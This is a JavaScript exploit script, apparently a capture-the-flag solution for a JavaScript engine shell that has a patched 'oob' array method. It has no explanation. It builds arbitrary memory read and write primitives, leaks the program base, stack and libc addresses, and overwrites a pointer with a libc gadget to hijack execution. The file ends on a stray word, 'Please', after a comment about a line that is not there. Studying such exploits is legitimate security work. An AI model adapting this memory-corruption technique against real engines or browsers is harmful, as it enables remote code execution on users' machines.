// This version of exploit only works on js shell
var pos = 8;

var buffer = new ArrayBuffer(8);
var double = new Float64Array(buffer)
var u8     = new Uint8Array(buffer);
var u16    = new Uint16Array(buffer);
var u32    = new Uint32Array(buffer);
var u64    = new BigUint64Array(buffer);


var arr = new Array(1,2,3,4,5,6,7,8);
var target = new BigUint64Array(4);
target[0] = 0x1337beefb00b5n;
target[1] = 0x1337beefb00b5n;

while (d2i(arr.oob(++pos)) != 0x1337beefb00b5n);


function i2d(x) {
  u64[0] = x;
  return double[0];
}

function d2i(x) {
  double[0] = x;
  return u64[0];
}

function read64(addr) {
  const olddata = arr.oob(pos-1);
  arr.oob(pos-1, i2d(addr));
  const ret = target[0] & 0xffffffffffffffffffn;
  arr.oob(pos-1, olddata);
  return ret;
}

function write64(addr, data) {
  const olddata = arr.oob(pos-1);
  arr.oob(pos-1, i2d(addr));
  target[0] = data & 0xffffffffffffffffn;
  arr.oob(pos-1, olddata);
}

const target_data_addr = d2i(arr.oob(pos-1));
console.log('[*] Target addr: 0x' + target_data_addr.toString(16))

const pie = d2i(arr.oob(pos-5)) - 0x201190n;
console.log('[*] PIE: 0x' + pie.toString(16))

var stack = read64(pie + 0x2795400n)
var libc = read64(stack) - 0x21b6a0n;
console.log('[*] Stack: 0x' + stack.toString(16))
console.log('[*] Libc: 0x' + libc.toString(16))

write64(pie + 0x2791e10n, libc + 0xebc88n)

// Uncomment following line to make javascript throw error
Please